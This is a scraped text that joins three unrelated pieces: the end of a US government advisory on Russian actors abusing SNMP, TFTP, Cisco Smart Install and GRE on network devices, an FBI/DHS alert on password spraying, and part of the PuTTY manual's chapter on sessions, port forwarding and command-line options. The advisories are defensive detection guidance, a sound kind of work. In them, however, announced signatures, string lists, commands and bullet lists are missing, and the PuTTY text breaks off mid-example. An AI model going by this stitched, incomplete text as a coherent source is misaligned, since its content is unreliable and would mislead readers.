strings may reveal login procedures, presentation of user credentials, commands to display boot or running configuration, copying files and creation or destruction of GRE tunnels, etc. See Appendices A and B for CLI strings for Cisco and other vendors’ devices.SNMP and TFTP Review network device logs and netflow data for indications of UDP SNMP traffic directed at port 161/162 on all network-device hosts. Because SNMP is a management tool, any such traffic that is not from a trusted management host on an internal network should be investigated. Review the source address of SNMP traffic for indications of addresses that spoof the address space of the network. Review outbound network traffic from the network device for evidence of Internet-destined UDP TFTP traffic. Any correlation of inbound or spoofed SNMP closely followed by outbound TFTP should be cause for alarm and further inspection. See Appendix C for detection of the cyber actors’ SNMP tactics.Because TFTP is an unencrypted protocol, session traffic will reveal strings associated with configuration data appropriate for the make and model of the device. See Appendices A and B for CLI strings for Cisco and other vendor’s devices.SMI and TFTPReview network device logs and netflow data for indications of TCP SMI protocol traffic directed at port 4786 of all network-device hosts. Because SMI is a management feature, any traffic that is not from a trusted management host on an internal network should be investigated. Review outbound network traffic from the network device for evidence of Internet-destined UDP TFTP traffic. Any correlation of inbound SMI closely followed by outbound TFTP should be cause for alarm and further inspection. Of note, between June 29 and July 6, 2017, Russian actors used the SMI protocol to scan for vulnerable network devices. Two Russian cyber actors controlled hosts 91.207.57.69(3) and 176.223.111.160(4), and connected to IPs on several network ranges on port 4786. See Appendix D for detection of the cyber actors’ SMI tactics.Because TFTP is an unencrypted protocol, session traffic will reveal strings appropriate for the make and model of the device. See Appendices A and B for CLI strings for Cisco and other vendors’ devices.Determine if SMI is presentDetect use of SMIThe following signature may be used to detect SMI usage. Flag as suspicious and investigate SMI traffic arriving from outside the network boundary. If SMI is not used inside the network, any SMI traffic arriving on an internal interface should be flagged as suspicious and investigated for the existence of an unauthorized SMI director. If SMI is used inside the network, ensure that the traffic is coming from an authorized SMI director, and not from a bogus director.Detect use of SIETThe following signatures detect usage of the SIET's commands change_config, get_config, update_ios, and execute. These signatures are valid based on the SIET tool available as of early September 2017:In general, exploitation attempts with the SIET tool will likely arrive from outside the network boundary. However, before attempting to tune or limit the range of these signatures, i.e. with $EXTERNAL_NET or $HOME_NET, it is recommended that they be deployed with the source and destination address ranges set to “any”. This will allow the possibility of detection of an attack from an unanticipated source, and may allow for coverage of devices outside of the normal scope of what may be defined as the $HOME_NET.GRE TunnelingInspect the presence of protocol 47 traffic flowing to or from unexpected addresses, or unexplained presence of GRE tunnel creation, modification, or destruction in log files.Mitigation StrategiesThere is a significant amount of publically available cybersecurity guidance and best practices from DHS, allied government, vendors, and the private-sector cybersecurity community on mitigation strategies for the exploitation vectors described above. The following are additional mitigations for network device manufacturers, ISPs, and owners or operators.General MitigationsAllManufacturersSecurity VendorsISPsOwners or operatorsDetailed MitigationsRefer to the vendor-specific guidance for the make and model of network device in operation.For information on mitigating SNMP vulnerabilities, seeHow to Mitigate SMI AbuseHow to Mitigate GRE Tunneling Abuse: Operating System Fingerprinting is analyzing characteristics of packets sent by a target, such as packet headers or listening ports, to identify the operating system in use on the target. [11]Spear phishing is an attempt by an individual or group to solicit personal information from unsuspecting users by employing social engineering techniques. Phishing emails are crafted to appear as if they were sent from a legitimate organization or known individual. These emails often attempt to entice users to click on a link that will take the user to a fraudulent website that appears legitimate. The user then may be asked to provide personal information, such as account usernames and passwords, which can further expose them to future compromises. [12]In a watering hole attack, the attacker compromises a site likely to be visited by a particular target group, rather than attacking the target group directly. [13] DHS encourages recipients who identify the use of tools or techniques discussed in this document to report information to NCCIC or law enforcement immediately. To request incident response resources or technical assistance, contact NCCIC at NCCICcustomerservice@hq.dhs.gov or 888-282-0870 and the FBI through a local field office or the FBI’s Cyber Division at CyWatch@fbi.gov or 855-292-3937. To request information from or report cyber incidents to UK authorities, contact NCSC at www.ncsc.gov.uk/contact. Command Strings.Commands associated with Cisco IOS. These strings may be seen in inbound network traffic of unencrypted management tools such as Telnet or HTTP, in the logs of application layer firewalls, or in the logs of network devices. Network device owners and operators should review the Cisco documentation of their particular makes and models for strings that would allow the owner or operator to customize the list for an Intrusion Detection System (IDS). Detecting commands from Internet-based hosts should be a cause for concern and further investigation. Detecting these strings in network traffic or log files does not confirm compromise. Further analysis is necessary to remove false positives.Strings:Configuration Strings.Strings associated with Cisco IOS configurations may be seen in the outbound network traffic of unencrypted management tools such as Telnet, HTTP, or TFTP. This is a subset of the possible strings. Network device owners and operators should export the configuration of their particular makes and models to a secure host and examine it for strings that would allow the owner or operator to customize the list for an IDS. Detecting outbound configuration data leaving an organization destined for Internet-based hosts should be a cause for concern and further investigation to ensure the destination is authorized to receive the configuration data. Because configuration data provides an adversary with information—such as the password hashes—to enable future attacks, configuration data should be encrypted between sender and receiver. Outbound configuration files may be triggered by SNMP queries and Cisco Smart Install commands. In such cases, the outbound file would be sent via TFTP. Detecting these strings in network traffic or log files does not confirm compromise. Further analysis is necessary to remove false positives.Strings: Russian state-sponsored cyber actors could potentially target the network devices from other manufacturers. Therefore, operators and owners should review the documentation associated with the make and model they have in operation to identify strings associated with administrative functions. Export the current configuration and identify strings associated with the configuration. Place the device-specific administrative and configuration strings into network-based and host-based IDS. Examples for Juniper JUNOS may include: “enable”, ”reload”, ”show”, ”set”, ”unset” ”file copy”, or ”request system scripts” followed by other expected parameters. Examples for MicroTic may include: “ip”, ”interface”, ”firewall”, ”password”, or ”ping”. See the documentation for your make and model for specific strings and parameters to place on watch.These strings may be seen in inbound network traffic of unencrypted management tools such as Telnet or HTTP, in the logs of application layer firewalls or network devices. Detecting commands from Internet-based hosts should be a cause for concern and further investigation. Detecting these strings in network traffic or log files does not confirm compromise. Further analysis is necessary to remove false positives.The following are important functions to monitor:  Between June 29 and July 6, 2017, Russian actors used the Cisco Smart Install protocol to scan for vulnerable network devices. Two Russian cyber actor-controlled hosts, 91.207.57.69(3) and 176.223.111.160(4), connected to IPs on several network ranges on port 4786 and sent the following two commands:In early July 2017, the commands sent to targets changed slightly, copying the running configuration file instead of the startup configuration file. Additionally, the second command copies the file saved to flash memory instead of directly copying the configuration file.This product is provided subject to this Notification and this Privacy & Use policy.Networked systemsAccording to information derived from FBI investigations, malicious cyber actors are increasingly using a style of brute force attack known as password spraying against organizations in the United States and abroad.On February 2018, the Department of Justice in the Southern District of New York, indicted nine Iranian nationals, who were associated with the Mabna Institute, for computer intrusion offenses related to activity described in this report. The techniques and activity described herein, while characteristic of Mabna actors, are not limited solely to use by this group.The Department of Homeland Security (DHS) and the Federal Bureau of Investigation (FBI) are releasing this Alert to provide further information on this activity.In a traditional brute-force attack, a malicious actor attempts to gain unauthorized access to a single account by guessing the password. This can quickly result in a targeted account getting locked-out, as commonly used account-lockout policies allow three to five bad attempts during a set period of time. During a password-spray attack (also known as the “low-and-slow” method), the malicious actor attempts a single password against many accounts before moving on to attempt a second password, and so on. This technique allows the actor to remain undetected by avoiding rapid or frequent account lockouts.Password spray campaigns typically target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols. An actor may target this specific protocol because federated authentication can help mask malicious traffic. Additionally, by targeting SSO applications, malicious actors hope to maximize access to intellectual property during a successful compromise. Email applications are also targeted. In those instances, malicious actors would have the ability to utilize inbox synchronization to (1) obtain unauthorized access to the organization's email directly from the cloud, (2) subsequently download user mail to locally stored email files, (3) identify the entire company’s email address list, and/or (4) surreptitiously implements inbox rules for the forwarding of sent and received messages.Traditional tactics, techniques, and procedures (TTPs) for conducting the password-spray attacks are as follows:Indicators of a password spray attack include:The vast majority of known password spray victims share some of the following characteristics [1][2]:A successful network intrusion can have severe impacts, particularly if the compromise becomes public and sensitive information is exposed. Possible impacts include:To help deter this style of attack, the following steps should be taken:The FBI encourages recipients of this document to report information concerning suspicious or criminal activity to their local FBI field office or the FBI’s 24/7 Cyber Watch (CyWatch). Field office contacts can be identified at www.fbi.gov/contact-us/field. CyWatch can be contacted by phone at (855) 292-3937 or by e-mail at CyWatch@ic.fbi.gov. When available, each report submitted should include the date, time, location, type of activity, number of people, and type of equipment used for the activity, the name of the submitting company or organization, and a designated point of contact. Press inquiries should be directed to the FBI’s national Press Office at npo@ic.fbi.gov or (202) 324-3691.This product is provided subject to this Notification and this Privacy & Use policy.Your browser does not support iframes.
Previous | Contents | Index | NextChapter 3: Using PuTTY3.1 During your session3.1.1 Copying and pasting text3.1.2 Scrolling the screen back3.1.3 The System menu3.2 Creating a log file of your session3.3 Altering your character set configuration3.4 Using X11 forwarding in SSH3.5 Using port forwarding in SSH3.6 Making raw TCP connections3.7 Connecting to a local serial line3.8 The PuTTY command line3.8.1 Starting a session from the command line3.8.2 -cleanup3.8.3 Standard command-line optionsChapter 3: Using PuTTY This chapter provides a general introduction to some more advanced features of PuTTY. For extreme detail and reference purposes, chapter 4 is likely to contain more information. 3.1 During your session A lot of PuTTY's complexity and features are in the configuration panel. Once you have worked your way through that and started a session, things should be reasonably simple after that. Nevertheless, there are a few more useful features available. 3.1.1 Copying and pasting textOften in a PuTTY session you will find text on your terminal screen which you want to type in again. Like most other terminal emulators, PuTTY allows you to copy and paste the text rather than having to type it again. Also, copy and paste uses the Windows clipboard, so that you can paste (for example) URLs into a web browser, or paste from a word processor or spreadsheet into your terminal session.  PuTTY's copy and paste works entirely with the mouse. In order to copy text to the clipboard, you just click the left mouse button in the terminal window, and drag to select text. When you let go of the button, the text is automatically copied to the clipboard. You do not need to press Ctrl-C or Ctrl-Ins; in fact, if you do press Ctrl-C, PuTTY will send a Ctrl-C character down your session to the server where it will probably cause a process to be interrupted.  Pasting is done using the right button (or the middle mouse button, if you have a three-button mouse and have set it up; see section 4.11.2). (Pressing Shift-Ins, or selecting ‘Paste’ from the Ctrl+right-click context menu, have the same effect.) When you click the right mouse button, PuTTY will read whatever is in the Windows clipboard and paste it into your session, exactly as if it had been typed at the keyboard. (Therefore, be careful of pasting formatted text into an editor that does automatic indenting; you may find that the spaces pasted from the clipboard plus the spaces added by the editor add up to too many spaces and ruin the formatting. There is nothing PuTTY can do about this.)  If you double-click the left mouse button, PuTTY will select a whole word. If you double-click, hold down the second click, and drag the mouse, PuTTY will select a sequence of whole words. (You can adjust precisely what PuTTY considers to be part of a word; see section 4.11.5.) If you triple-click, or triple-click and drag, then PuTTY will select a whole line or sequence of lines.  If you want to select a rectangular region instead of selecting to the end of each line, you can do this by holding down Alt when you make your selection. You can also configure rectangular selection to be the default, and then holding down Alt gives the normal behaviour instead: see section 4.11.4 for details.  (In some Unix environments, Alt+drag is intercepted by the window manager. Shift+Alt+drag should work for rectangular selection as well, so you could try that instead.)  If you have a middle mouse button, then you can use it to adjust an existing selection if you selected something slightly wrong. (If you have configured the middle mouse button to paste, then the right mouse button does this instead.) Click the button on the screen, and you can pick up the nearest end of the selection and drag it to somewhere else.  It's possible for the server to ask to handle mouse clicks in the PuTTY window itself. If this happens, the mouse pointer will turn into an arrow, and using the mouse to copy and paste will only work if you hold down Shift. See section 4.6.2 and section 4.11.3 for details of this feature and how to configure it. 3.1.2 Scrolling the screen back PuTTY keeps track of text that has scrolled up off the top of the terminal. So if something appears on the screen that you want to read, but it scrolls too fast and it's gone by the time you try to look for it, you can use the scrollbar on the right side of the window to look back up the session history and find it again.  As well as using the scrollbar, you can also page the scrollback up and down by pressing Shift-PgUp and Shift-PgDn. You can scroll a line at a time using Ctrl-PgUp and Ctrl-PgDn. These are still available if you configure the scrollbar to be invisible.  By default the last 2000 lines scrolled off the top are preserved for you to look at. You can increase (or decrease) this value using the configuration box; see section 4.7.3. 3.1.3 The System menu If you click the left mouse button on the icon in the top left corner of PuTTY's terminal window, or click the right mouse button on the title bar, you will see the standard Windows system menu containing items like Minimise, Move, Size and Close.  PuTTY's system menu contains extra program features in addition to the Windows standard options. These extra menu commands are described below.  (These options are also available in a context menu brought up by holding Ctrl and clicking with the right mouse button anywhere in the PuTTY window.) 3.1.3.1 The PuTTY Event Log If you choose ‘Event Log’ from the system menu, a small window will pop up in which PuTTY logs significant events during the connection. Most of the events in the log will probably take place during session startup, but a few can occur at any point in the session, and one or two occur right at the end.  You can use the mouse to select one or more lines of the Event Log, and hit the Copy button to copy them to the clipboard. If you are reporting a bug, it's often useful to paste the contents of the Event Log into your bug report.  (The Event Log is not the same as the facility to create a log file of your session; that's described in section 3.2.) 3.1.3.2 Special commands Depending on the protocol used for the current session, there may be a submenu of ‘special commands’. These are protocol-specific tokens, such as a ‘break’ signal, that can be sent down a connection in addition to normal data. Their precise effect is usually up to the server. Currently only Telnet, SSH, and serial connections have special commands.  The ‘break’ signal can also be invoked from the keyboard with Ctrl-Break.  The following special commands are available in Telnet: Are You There Break Synch Erase Character  PuTTY can also be configured to send this when the Backspace key is pressed; see section 4.16.3. Erase Line Go Ahead No Operation  Should have no effect. Abort Process Abort Output Interrupt Process  PuTTY can also be configured to send this when Ctrl-C is typed; see section 4.16.3. Suspend Process  PuTTY can also be configured to send this when Ctrl-Z is typed; see section 4.16.3. End Of Record End Of File  In an SSH connection, the following special commands are available: IGNORE message  Should have no effect. Repeat key exchange  Only available in SSH-2. Forces a repeat key exchange immediately (and resets associated timers and counters). For more information about repeat key exchanges, see section 4.19.2. Cache new host key type  Only available in SSH-2. This submenu appears only if the server has host keys of a type that PuTTY doesn't already have cached, and so won't consider. Selecting a key here will allow PuTTY to use that key now and in future: PuTTY will do a fresh key-exchange with the selected key, and immediately add that key to its permanent cache (relying on the host key used at the start of the connection to cross-certify the new key). That key will be used for the rest of the current session; it may not actually be used for future sessions, depending on your preferences (see section 4.20.1).  Normally, PuTTY will carry on using a host key it already knows, even if the server offers key formats that PuTTY would otherwise prefer, to avoid host key prompts. As a result, if you've been using a server for some years, you may still be using an older key than a new user would use, due to server upgrades in the meantime. The SSH protocol unfortunately does not have organised facilities for host key migration and rollover, but this allows you to manually upgrade. Break  Only available in SSH-2, and only during a session. Optional extension; may not be supported by server. PuTTY requests the server's default break length. Signals (SIGINT, SIGTERM etc)  Only available in SSH-2, and only during a session. Sends various POSIX signals. Not honoured by all servers.  With a serial connection, the only available special command is ‘Break’. 3.1.3.3 Starting new sessions PuTTY's system menu provides some shortcut ways to start new sessions:  Selecting ‘New Session’ will start a completely new instance of PuTTY, and bring up the configuration box as normal.  Selecting ‘Duplicate Session’ will start a session in a new window with precisely the same options as your current one - connecting to the same host using the same protocol, with all the same terminal settings and everything.  In an inactive window, selecting ‘Restart Session’ will do the same as ‘Duplicate Session’, but in the current window.  The ‘Saved Sessions’ submenu gives you quick access to any sets of stored session details you have previously saved. See section 4.1.2 for details of how to create saved sessions. 3.1.3.4 Changing your session settings If you select ‘Change Settings’ from the system menu, PuTTY will display a cut-down version of its initial configuration box. This allows you to adjust most properties of your current session. You can change the terminal size, the font, the actions of various keypresses, the colours, and so on.  Some of the options that are available in the main configuration box are not shown in the cut-down Change Settings box. These are usually options which don't make sense to change in the middle of a session (for example, you can't switch from SSH to Telnet in mid-session).  You can save the current settings to a saved session for future use from this dialog box. See section 4.1.2 for more on saved sessions. 3.1.3.5 Copy All to Clipboard This system menu option provides a convenient way to copy the whole contents of the terminal screen (up to the last nonempty line) and scrollback to the clipboard in one go. 3.1.3.6 Clearing and resetting the terminal The ‘Clear Scrollback’ option on the system menu tells PuTTY to discard all the lines of text that have been kept after they scrolled off the top of the screen. This might be useful, for example, if you displayed sensitive information and wanted to make sure nobody could look over your shoulder and see it. (Note that this only prevents a casual user from using the scrollbar to view the information; the text is not guaranteed not to still be in PuTTY's memory.)  The ‘Reset Terminal’ option causes a full reset of the terminal emulation. A VT-series terminal is a complex piece of software and can easily get into a state where all the text printed becomes unreadable. (This can happen, for example, if you accidentally output a binary file to your terminal.) If this happens, selecting Reset Terminal should sort it out. 3.1.3.7 Full screen mode If you find the title bar on a maximised window to be ugly or distracting, you can select Full Screen mode to maximise PuTTY ‘even more’. When you select this, PuTTY will expand to fill the whole screen and its borders, title bar and scrollbar will disappear. (You can configure the scrollbar not to disappear in full-screen mode if you want to keep it; see section 4.7.3.)  When you are in full-screen mode, you can still access the system menu if you click the left mouse button in the extreme top left corner of the screen. 3.2 Creating a log file of your session For some purposes you may find you want to log everything that appears on your screen. You can do this using the ‘Logging’ panel in the configuration box.  To begin a session log, select ‘Change Settings’ from the system menu and go to the Logging panel. Enter a log file name, and select a logging mode. (You can log all session output including the terminal control sequences, or you can just log the printable text. It depends what you want the log for.) Click ‘Apply’ and your log will be started. Later on, you can go back to the Logging panel and select ‘Logging turned off completely’ to stop logging; then PuTTY will close the log file and you can safely read it.  See section 4.2 for more details and options. 3.3 Altering your character set configuration If you find that special characters (accented characters, for example, or line-drawing characters) are not being displayed correctly in your PuTTY session, it may be that PuTTY is interpreting the characters sent by the server according to the wrong character set. There are a lot of different character sets available, and no good way for PuTTY to know which to use, so it's entirely possible for this to happen.  If you click ‘Change Settings’ and look at the ‘Translation’ panel, you should see a large number of character sets which you can select, and other related options. Now all you need is to find out which of them you want! (See section 4.10 for more information.) 3.4 Using X11 forwarding in SSH The SSH protocol has the ability to securely forward X Window System graphical applications over your encrypted SSH connection, so that you can run an application on the SSH server machine and have it put its windows up on your local machine without sending any X network traffic in the clear.  In order to use this feature, you will need an X display server for your Windows machine, such as Cygwin/X, X-Win32, or Exceed. This will probably install itself as display number 0 on your local machine; if it doesn't, the manual for the X server should tell you what it does do.  You should then tick the ‘Enable X11 forwarding’ box in the X11 panel (see section 4.25) before starting your SSH session. The ‘X display location’ box is blank by default, which means that PuTTY will try to use a sensible default such as :0, which is the usual display location where your X server will be installed. If that needs changing, then change it.  Now you should be able to log in to the SSH server as normal. To check that X forwarding has been successfully negotiated during connection startup, you can check the PuTTY Event Log (see section 3.1.3.1). It should say something like this: 2001-12-05 17:22:01 Requesting X11 forwarding
2001-12-05 17:22:02 X11 forwarding enabled
 If the remote system is Unix or Unix-like, you should also be able to see that the DISPLAY environment variable has been set to point at display 10 or above on the SSH server machine itself: fred@unixbox:~$ echo $DISPLAY
unixbox:10.0
 If this works, you should then be able to run X applications in the remote session and have them display their windows on your PC.  For more options relating to X11 forwarding, see section 4.25. 3.5 Using port forwarding in SSH The SSH protocol has the ability to forward arbitrary network (TCP) connections over your encrypted SSH connection, to avoid the network traffic being sent in clear. For example, you could use this to connect from your home computer to a POP-3 server on a remote machine without your POP-3 password being visible to network sniffers.  In order to use port forwarding to connect from your local machine to a port on a remote server, you need to:  Choose a port number on your local machine where PuTTY should listen for incoming connections. There are likely to be plenty of unused port numbers above 3000. (You can also use a local loopback address here; see below for more details.)  Now, before you start your SSH connection, go to the Tunnels panel (see section 4.26). Make sure the ‘Local’ radio button is set. Enter the local port number into the ‘Source port’ box. Enter the destination host name and port number into the ‘Destination’ box, separated by a colon (for example, popserver.example.com:110 to connect to a POP-3 server).  Now click the ‘Add’ button. The details of your port forwarding should appear in the list box.  Now start your session and log in. (Port forwarding will not be enabled until after you have logged in; otherwise it would be easy to perform completely anonymous network attacks, and gain access to anyone's virtual private network.) To check that PuTTY has set up the port forwarding correctly, you can look at the PuTTY Event Log (see section 3.1.3.1). It should say something like this: 2001-12-05 17:22:10 Local port 3110 forwarding to
         popserver.example.com:110
 Now if you connect to the source port number on your local PC, you should find that it answers you exactly as if it were the service running on the destination machine. So in this example, you could then configure an e-mail client to use localhost:3110 as a POP-3 server instead of popserver.example.com:110. (Of course, the forwarding will stop happening when your PuTTY session closes down.)  You can also forward ports in the other direction: arrange for a particular port number on the server machine to be forwarded back to your PC as a connection to a service on your PC or near it. To do this, just select the ‘Remote’ radio button instead of the ‘Local’ one. The ‘Source port’ box will now specify a port number on the server (note that most servers will not allow you to use port numbers under 1024 for this purpose).  An alternative way to forward local connections to remote hosts is to use dynamic SOCKS proxying. In this mode, PuTTY acts as a SOCKS server, which SOCKS-aware programs can connect to and open forwarded connections to the destination of their choice, so this can be an alternative to long lists of static forwardings. To use this mode, you will need to select the ‘Dynamic’ radio button instead of ‘Local’, and then you should not enter anything into the ‘Destination’ box (it will be ignored). PuTTY will then listen for SOCKS connections on the port you have specified. Most web browsers can be configured to connect to this SOCKS proxy service; also, you can forward other PuTTY connections through it by setting up the Proxy control panel (see section 4.15 for details).  The source port for a forwarded connection usually does not accept connections from any machine except the SSH client or server machine itself (for local and remote forwardings respectively). There are controls in the Tunnels panel to change this:  The ‘Local ports accept connections from other hosts’ option allows you to set up local-to-remote port forwardings (including dynamic port forwardings) in such a way that machines other than your client PC can connect to the forwarded port.  The ‘Remote ports do the same’ option does the same thing for remote-to-local port forwardings (so that machines other than the SSH server machine can connect to the forwarded port.) Note that this feature is only available in the SSH-2 protocol, and not all SSH-2 servers honour it (in OpenSSH, for example, it's usually disabled by default).  You can also specify an IP address to listen on. Typically a Windows machine can be asked to listen on any single IP address in the 127.*.*.* range, and all of these are loopback addresses available only to the local machine. So if you forward (for example) 127.0.0.5:79 to a remote machine's finger port, then you should be able to run commands such as finger fred@127.0.0.5. This can be useful if the program connecting to the forwarded port doesn't allow you to change the port number it uses. This feature is available for local-to-remote forwarded ports; SSH-1 is unable to support it for remote-to-local ports, while SSH-2 can support it in theory but servers will not necessarily cooperate.  (Note that if you're using Windows XP Service Pack 2, you may need to obtain a fix from Microsoft in order to use addresses like 127.0.0.5 - see question A.7.20.)  For more options relating to port forwarding, see section 4.26.  If the connection you are forwarding over SSH is itself a second SSH connection made by another copy of PuTTY, you might find the ‘logical host name’ configuration option useful to warn PuTTY of which host key it should be expecting. See section 4.13.5 for details of this. 3.6 Making raw TCP connections A lot of Internet protocols are composed of commands and responses in plain text. For example, SMTP (the protocol used to transfer e-mail), NNTP (the protocol used to transfer Usenet news), and HTTP (the protocol used to serve Web pages) all consist of commands in readable plain text.  Sometimes it can be useful to connect directly to one of these services and speak the protocol ‘by hand’, by typing protocol commands and watching the responses. On Unix machines, you can do this using the system's telnet command to connect to the right port number. For example, telnet mailserver.example.com 25 might enable you to talk directly to the SMTP service running on a mail server.  Although the Unix telnet program provides this functionality, the protocol being used is not really Telnet. Really there is no actual protocol at all; the bytes sent down the connection are exactly the ones you type, and the bytes shown on the screen are exactly the ones sent by the server. Unix telnet will attempt to detect or guess whether the service it is talking to is a real Telnet service or not; PuTTY prefers to be told for certain.  In order to make a debugging connection to a service of this type, you simply select the fourth protocol name, ‘Raw’, from the ‘Protocol’ buttons in the ‘Session’ configuration panel. (See section 4.1.1.) You can then enter a host name and a port number, and make the connection. 3.7 Connecting to a local serial line PuTTY can connect directly to a local serial line as an alternative to making a network connection. In this mode, text typed into the PuTTY window will be sent straight out of your computer's serial port, and data received through that port will be displayed in the PuTTY window. You might use this mode, for example, if your serial port is connected to another computer which has a serial connection.  To make a connection of this type, simply select ‘Serial’ from the ‘Connection type’ radio buttons on the ‘Session’ configuration panel (see section 4.1.1). The ‘Host Name’ and ‘Port’ boxes will transform into ‘Serial line’ and ‘Speed’, allowing you to specify which serial line to use (if your computer has more than one) and what speed (baud rate) to use when transferring data. For further configuration options (data bits, stop bits, parity, flow control), you can use the ‘Serial’ configuration panel (see section 4.28).  After you start up PuTTY in serial mode, you might find that you have to make the first move, by sending some data out of the serial line in order to notify the device at the other end that someone is there for it to talk to. This probably depends on the device. If you start up a PuTTY serial session and nothing appears in the window, try pressing Return a few times and see if that helps.  A serial line provides no well defined means for one end of the connection to notify the other that the connection is finished. Therefore, PuTTY in serial mode will remain connected until you close the window using the close button. 3.8 The PuTTY command line PuTTY can be made to do various things without user intervention by supplying command-line arguments (e.g., from a command prompt window, or a Windows shortcut). 3.8.1 Starting a session from the command lineThese options allow you to bypass the configuration window and launch straight into a session.  To start a connection to a server called host: putty.exe [-ssh | -telnet | -rlogin | -raw] [user@]host
 If this syntax is used, settings are taken from the Default Settings (see section 4.1.2); user overrides these settings if supplied. Also, you can specify a protocol, which will override the default protocol (see section 3.8.3.2).  For telnet sessions, the following alternative syntax is supported (this makes PuTTY suitable for use as a URL handler for telnet URLs in web browsers): putty.exe telnet://host[:port]/
 To start a connection to a serial port, e.g. COM1: putty.exe -serial com1
 In order to start an existing saved session called sessionname, use the -load option (described in section 3.8.3.1). putty.exe -load "session name"
3.8.2 -cleanup If invoked with the -cleanup option, rather than running as normal, PuTTY will remove its registry entries and random seed file from the local machine (after confirming with the user). It will also attempt to remove information about recently launched sessions stored in the ‘jump list’ on Windows 7 and up.  Note that on multi-user systems, -cleanup only removes registry entries and files associated with the currently logged-in user. 3.8.3 Standard command-line options PuTTY and its associated tools support a range of command-line options, most of which are consistent across all the tools. This section lists the available options in all tools. Options which are specific to a particular tool are covered in the chapter about that tool. 3.8.3.1 -load: load a saved sessionThe -load option causes PuTTY to load configuration details out of a saved session. If these details include a host name, then this option is all you need to make PuTTY start a session.  You need double quotes around the session name if it contains spaces.  If you want to create a Windows shortcut to start a PuTTY saved session, this is the option you should use: your shortcut should call something like d:\path\to\putty.exe -load "my session"
 (Note that PuTTY itself supports an alternative form of this option, for backwards compatibility. If you execute putty @sessionname it will have the same effect as putty -load "sessionname". With the @ form, no double quotes are required, and the @ sign must be the very first thing on the command line. This form of the option is deprecated.) 3.8.3.2 Selecting a protocol: -ssh, -telnet, -rlogin, -raw -serial To choose which protocol you want to connect with, you can use one of these options: -ssh selects the SSH protocol. -telnet selects the Telnet protocol. -rlogin selects the Rlogin protocol. -raw selects the raw protocol. -serial selects a serial connection.  These options are not available in the file transfer tools PSCP and PSFTP (which only work with the SSH protocol).  These options are equivalent to the protocol selection buttons in the Session panel of the PuTTY configuration box (see section 4.1.1). 3.8.3.3 -v: increase verbosityMost of the PuTTY tools can be made to tell you more about what they are doing by supplying the -v option. If you are having trouble when making a connection, or you're simply curious, you can turn this switch on and hope to find out more about what is happening. 3.8.3.4 -l: specify a login name You can specify the user name to log in as on the remote server using the -l option. For example, plink login.example.com -l fred.  These options are equivalent to the username selection box in the Connection panel of the PuTTY configuration box (see section 4.14.1). 3.8.3.5 -L, -R and -D: set up port forwardings As well as setting up port forwardings in the PuTTY configuration (see section 4.26), you can also set up forwardings on the command line. The command-line options work just like the ones in Unix ssh programs.  To forward a local port (say 5110) to a remote destination (say popserver.example.com port 110), you can write something like one of these: putty -L 5110:popserver.example.com:110 -load mysession
plink mysession -L 5110:popserver.example.com:110
 To forward a remote port to a local destination, just use the -R option instead of -L: putty -R 5023:mytelnetserver.myhouse.org:23 -load mysession
plink mysession -R 5023:mytelnetserver.myhouse.org:23
 To specify an IP address for the listening end of the tunnel, prepend it to the argument: plink -L 127.0.0.5:23:localhost:23 myhost
 To set up SOCKS-based dynamic port forwarding on a local port, use the -D option. For this one you only have to pass the port number: putty -D 4096 -load mysession
 For general information on port forwarding, see section 3.5.  These options are not available in the file transfer tools PSCP and PSFTP. 3.8.3.6 -m: read a remote command or script from a file The -m option performs a similar function to the ‘Remote command’ box in the SSH panel of the PuTTY configuration box (see section 4.18.1). However, the -m option expects to be given a local file name, and it will read a command from that file.  With some servers (particularly Unix systems), you can even put multiple lines in this file and execute more than one command in sequence, or a whole shell script; but this is arguably an abuse, and cannot be expected to work on all servers. In particular, it is known not to work with certain ‘embedded’ servers, such as Cisco routers.  This option is not available in the file transfer tools PSCP and PSFTP. 3.8.3.7 -P: specify a port number The -P option is used to specify the port number to connect to. If you have a Telnet server running on port 9696 of a machine instead of port 23, for example: putty -telnet -P 9696 host.name
plink -telnet -P 9696 host.name
 (Note that this option is more useful in Plink than in PuTTY, because in PuTTY you can write putty -telnet host.name 9696 in any case.)  This option is equivalent to the port number control in the Session panel of the PuTTY configuration box (see section 4.1.1). 3.8.3.8 -pw: specify a password A simple way to automate a remote login is to supply your password on the command line. This is not recommended for reasons of security. If you possibly can, we recommend you set up public-key authentication instead. See chapter 8 for details.  Note that the -pw option only works when you are using the SSH protocol. Due to fundamental limitations of Telnet and Rlogin, these protocols do not support automated password authentication. 3.8.3.9 -agent and -noagent: control use of Pageant for authentication The -agent option turns on SSH authentication using Pageant, and -noagent turns it off. These options are only meaningful if you are using SSH.  See chapter 9 for general information on Pageant.  These options are equivalent to the agent authentication checkbox in the Auth panel of the PuTTY configuration box (see section 4.22.3). 3.8.3.10 -A and -a: control agent forwarding The -A option turns on SSH agent forwarding, and -a turns it off. These options are only meaningful if you are using SSH.  See chapter 9 for general information on Pageant, and section 9.4 for information on agent forwarding. Note that there is a security risk involved with enabling this option; see section 9.5 for details.  These options are equivalent to the agent forwarding checkbox in the Auth panel of the PuTTY configuration box (see section 4.22.6).  These options are not available in the file transfer tools PSCP and PSFTP. 3.8.3.11 -X and -x: control X11 forwarding The -X option turns on X11 forwarding in SSH, and -x turns it off. These options are only meaningful if you are using SSH.  For information on X11 forwarding, see section 3.4.  These options are equivalent to the X11 forwarding checkbox in the X11 panel of the PuTTY configuration box (see section 4.25).  These options are not available in the file transfer tools PSCP and PSFTP. 3.8.3.12 -t and -T: control pseudo-terminal allocation The -t option ensures PuTTY attempts to allocate a pseudo-terminal at the server, and -T stops it from allocating one. These options are only meaningful if you are using SSH.  These options are equivalent to the ‘Don't allocate a pseudo-terminal’ checkbox in the SSH panel of the PuTTY configuration box (see section 4.24.1).  These options are not available in the file transfer tools PSCP and PSFTP. 3.8.3.13 -N: suppress starting a shell or command The -N option prevents PuTTY from attempting to start a shell or command on the remote server. You might want to use this option if you are only using the SSH connection for port forwarding, and your user account on the server does not have the ability to run a shell.  This feature is only available in SSH protocol version 2 (since the version 1 protocol assumes you will always want to run a shell).  This option is equivalent to the ‘Don't start a shell or command at all’ checkbox in the SSH panel of the PuTTY configuration box (see section 4.18.2).  This option is not available in the file transfer tools PSCP and PSFTP. 3.8.3.14 -nc: make a remote network connection in place of a remote shell or command The -nc option prevents Plink (or PuTTY) from attempting to start a shell or command on the remote server. Instead, it will instruct the remote server to open a network connection to a host name and port number specified by you, and treat that network connection as if it were the main session.  You specify a host and port as an argument to the -nc option, with a colon separating the host name from the port number, like this: plink host1.example.com -nc host2.example.com:1234
